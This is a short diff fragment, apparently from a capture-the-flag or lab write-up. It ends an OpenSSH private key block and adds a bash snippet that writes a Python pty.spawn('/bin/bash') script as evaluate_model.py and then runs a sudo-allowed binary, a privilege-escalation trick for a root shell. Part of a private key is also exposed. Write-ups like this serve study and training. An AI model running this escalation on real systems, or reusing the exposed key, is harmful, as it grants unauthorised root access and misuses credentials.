@@ -94,3 +94,8 @@ GNNR4BXqnM9tk1wLIFwPxKYO6m2flYUF2Ekx7HnrmFISQKravUE1WZjfPjEkTFZb+spHa1
 RGR4erBSUqwA0AAAAOamlwcGl0eUBibHVycnkBAgMEBQ==
 -----END OPENSSH PRIVATE KEY-----
 ```
+
+```bash
+echo -e 'import pty\npty.spawn("/bin/bash")' > evaluate_model.py
+sudo /usr/bin/evaluate_model /models/*.pth
+```
